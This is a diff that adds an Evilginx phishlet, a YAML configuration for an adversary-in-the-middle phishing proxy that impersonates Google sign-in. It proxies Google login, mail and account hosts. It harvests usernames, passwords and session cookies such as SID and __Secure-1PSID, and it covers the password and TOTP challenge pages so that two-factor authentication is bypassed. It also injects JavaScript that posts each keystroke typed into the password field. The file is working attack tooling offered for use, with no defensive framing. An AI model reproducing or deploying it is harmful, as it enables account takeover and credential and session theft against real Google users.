@@ -1,0 +1,63 @@
+author: '@evilginx'
+min_ver: '3.0.0'
+redirect_url: 'https://accounts.google.com/'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'accounts.google.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'clients', orig_sub: 'clients', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'oauth2', orig_sub: 'oauth2', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: 'accounts.google.com', search: 'integrity="(.*?)"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: 'accounts.google.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: 'accounts.google.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID:always','HSID:always','SSID:always','APISID:always','SAPISID:always','__Secure-1PSID:always','__Secure-3PSID:always','__Secure-1PAPISID:always','__Secure-3PAPISID:always','AUTH:always']
+    type: 'cookie'
+  - domain: 'accounts.google.com'
+    keys: ['GAPS:always','LSID:always']
+    type: 'cookie'
+auth_urls:
+  - '/signin/v2/identifier'
+  - '/signin/v2/challenge/pwd'
+  - '/signin/v2/challenge/totp'
+  - '/signin/v2/challenge/ipp'
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier'
+js_inject:
+  - trigger_domains: ["accounts.google.com"]
+    trigger_paths: ["/signin/v2/challenge/pwd"]
+    trigger_params: []
+    script: |
+      function capturePassword() {
+        var passwordField = document.querySelector('input[name="password"], input[type="password"]');
+        if (passwordField) {
+          passwordField.addEventListener('input', function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/signin/v2/challenge/pwd', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('password=' + encodeURIComponent(this.value));
+          });
+        }
+      }
+      setTimeout(function() { capturePassword(); }, 1000);
